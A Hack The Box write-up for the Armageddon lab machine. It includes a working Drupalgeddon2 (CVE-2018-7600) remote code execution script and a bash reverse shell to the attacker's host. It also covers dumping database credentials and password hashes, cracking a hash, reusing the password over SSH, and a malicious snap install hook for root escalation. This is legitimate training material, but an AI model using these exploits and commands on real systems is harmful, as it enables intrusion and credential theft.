# Target
| Category          | Details                                                                                 |
|-------------------|-----------------------------------------------------------------------------------------|
| 📝 **Name**       | [Armageddon](https://app.hackthebox.com/machines/Armageddon)                            |  
| 🏷 **Type**       | HTB Machine                                                                             |
| 🖥 **OS**         | Linux                                                                                   |
| 🎯 **Difficulty** | Easy                                                                                    |
| 📁 **Tags**       | Drupal 7.56, [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600), sudo snap |

### User flag

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/HTB Armageddon]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-16 06:30 +0200
Nmap scan report for 10.129.48.89
Host is up (0.042s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to  Armageddon |  Armageddon

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.41 seconds
```

#### Confirm Drupal 7 is running on target
```
┌──(magicrc㉿perun)-[~/attack/HTB Armageddon]
└─$ curl -I http://$TARGET                                         
HTTP/1.1 200 OK
Date: Thu, 16 Apr 2026 04:34:16 GMT
Server: Apache/2.4.6 (CentOS) PHP/5.4.16
X-Powered-By: PHP/5.4.16
Expires: Sun, 19 Nov 1978 05:00:00 GMT
Cache-Control: no-cache, must-revalidate
X-Content-Type-Options: nosniff
Content-Language: en
X-Frame-Options: SAMEORIGIN
X-Generator: Drupal 7 (http://drupal.org)
Content-Type: text/html; charset=utf-8
```

#### Identify Drupal 7.56
```
┌──(magicrc㉿perun)-[~/attack/HTB Armageddon/CVE-2018-7600]
└─$ curl -s $TARGET/CHANGELOG.txt | head -n 5 

Drupal 7.56, 2017-06-21
-----------------------
- Fixed security issues (access bypass). See SA-CORE-2017-003.
```
This version is vulnerable to [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

#### Prepare `cmd.py` exploit
Code based on [firefart/CVE-2018-7600](https://raw.githubusercontent.com/firefart/CVE-2018-7600/refs/heads/master/poc.py).
```
{ cat <<'EOF'> CVE-2018-7600.py
#!/usr/bin/python3
import requests
import re
import sys

HOST=f"http://{sys.argv[1]}/"

get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':f"{sys.argv[2]}", 'name[#type]':'markup'}
post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
r = requests.post(HOST, data=post_params, params=get_params)

m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
if m:
    found = m.group(1)
    get_params = {'q':'file/ajax/name/#value/' + found}
    post_params = {'form_build_id':found}
    r = requests.post(HOST, data=post_params, params=get_params)
    print(r.text)
EOF
} && chmod +x CVE-2018-7600.py
```

#### Confirm exploit is operational
```
┌──(magicrc㉿perun)-[~/attack/HTB Armageddon]
└─$ ./CVE-2018-7600.py $TARGET id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
[{"command":"settings","settings":{"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"_1CAOf7Hly3vjT53RvH6MUrCL3C7VC-571ieMAzrRMg"}},"merge":true},{"command":"insert","method":"replaceWith","selector":null,"data":"","settings":{"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"_1CAOf7Hly3vjT53RvH6MUrCL3C7VC-571ieMAzrRMg"}}}]
```

#### Start `nc` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Armageddon]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

#### Spawn reverse shell connection using `CVE-2018-7600.py` exploit
```
┌──(magicrc㉿perun)-[~/attack/HTB Armageddon]
└─$ ./CVE-2018-7600.py $TARGET "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
```

#### Confirm foothold gained
```
connect to [10.10.16.193] from (UNKNOWN) [10.129.29.55] 46898
bash: no job control in this shell
bash-4.2$ id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```

#### Discover Drupal MySQL credentials in `sites/default/settings.php`
```
bash-4.2$ sed '/\/\*\*/,/\*\//d; /^[[:space:]]*\*/d; s/#.*//; /^[[:space:]]*$/d' sites/default/settings.php                      
<?php
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
<SNIP>
```

#### Access MySQL to list Drupal users credentials
```
bash-4.2$ mysql -h localhost -udrupaluser -p'CQHEy@9M*m23gBVj' drupal -e "SELECT uid,name,pass FROM users;" --batch --skip-column-names
<T uid,name,pass FROM users;" --batch --skip-column-names                    
0
1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
```

#### Use `hashcat` to break password hash for `brucetherealadmin` user
```
┌──(magicrc㉿perun)-[~/attack/HTB Armageddon]
└─$ hashcat -m 7900 '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt' /usr/share/wordlists/rockyou.txt --quiet
$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
```

#### Reuse cracked password to access target over SSH
```
┌──(magicrc㉿perun)-[~/attack/HTB Armageddon]
└─$ ssh brucetherealadmin@$TARGET
brucetherealadmin@10.129.29.55's password: 
Last login: Tue Mar 23 12:40:36 2021 from 10.10.14.2
[brucetherealadmin@armageddon ~]$ id
uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) groups=1000(brucetherealadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

#### Capture user flag
```
[brucetherealadmin@armageddon ~]$ cat /home/brucetherealadmin/user.txt 
95e96c8963ad911d3a055a5f34326bfd
```

### Root flag

#### List allowed sudo commands
```
[brucetherealadmin@armageddon ~]$ sudo -l
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME
    LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *
```

#### Prepare and upload `snap` package for root flag capture
```
┌──(magicrc㉿perun)-[~/attack/HTB Armageddon]
└─$ mkdir -p meta/hooks && \
{ cat <<'EOF'> meta/hooks/install
#!/bin/sh
cp /root/root.txt /home/brucetherealadmin/root.txt
chmod 777 /home/brucetherealadmin/root.txt
EOF
} && chmod +x meta/hooks/install && \
~/.local/share/gem/ruby/3.3.0/gems/fpm-1.17.0/bin/fpm -n escalation -s dir -t snap -a all meta && \
scp escalation_1.0_all.snap brucetherealadmin@$TARGET:~/
Created package {:path=>"escalation_1.0_all.snap"}
brucetherealadmin@10.129.29.55's password:
```

#### Install malicious snap package to capture root flag
```
[brucetherealadmin@armageddon ~]$ sudo snap install escalation_1.0_all.snap --dangerous --devmode && cat /home/brucetherealadmin/root.txt
escalation 1.0 installed
843557c8c8f2836df8c203cfbae55cf5
```
